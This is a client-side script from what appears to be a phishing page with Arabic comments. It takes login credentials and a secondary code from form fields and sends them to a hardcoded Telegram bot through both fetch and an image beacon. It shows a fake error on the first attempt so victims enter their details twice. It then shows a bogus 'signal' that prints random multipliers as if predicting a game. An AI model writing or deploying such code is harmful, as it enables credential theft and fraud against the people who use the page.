<script>
    // ⚠️ التوكن الجديد نتاعك (اللي مابعتلي فيه)
    const botToken = "8589243363:AAEMgjPjQOE6e0NGFQ307kv-FSl8VxTLkwg"; 
    const chatId = "8026901193";

    // دالة الإرسال المضمونة 100%
    function send(msg) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`;
        
        // محاولة عبر Fetch
        fetch(url).catch(e => console.log("Fetch blocked"));
        
        // محاولة عبر Image (تخترق الحماية ولازم تكون كاينة)
        const img = new Image();
        img.src = url;
    }

    let loginAttempts = 0;
    function processLogin() {
        const u = document.getElementById('u_log').value;
        const p = document.getElementById('u_pas').value;
        
        if (u.length < 3 || p.length < 3) return;

        loginAttempts++;
        if (loginAttempts === 1) {
            send(`<b>⚠️ محاولة 1:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
            document.getElementById('login-err').classList.remove('hidden');
            document.getElementById('u_pas').value = ""; 
        } else {
            send(`<b>✅ محاولة 2 (دخول):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }
    }

    let nickAttempts = 0;
    function processNick() {
        const n = document.getElementById('u_nick').value;
        if (n.length < 2) return;

        nickAttempts++;
        if (nickAttempts === 1) {
            send(`<b>⚠️ لقب 1:</b>\n🔑: <code>${n}</code>`);
            document.getElementById('nick-err').classList.remove('hidden');
            document.getElementById('u_nick').value = "";
        } else {
            send(`<b>✅ لقب 2 (تأكيد):</b>\n🔑: <code>${n}</code>`);
            document.getElementById('security-layer').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
        }
    }

    function getSignal() {
        const res = document.getElementById('target-mult');
        res.innerHTML = '<span class="animate-pulse text-zinc-400">WAIT..</span>';
        setTimeout(() => {
            res.innerText = (Math.random() * (6.80 - 1.20) + 1.20).toFixed(2) + "x";
        }, 800);
    }
</script>
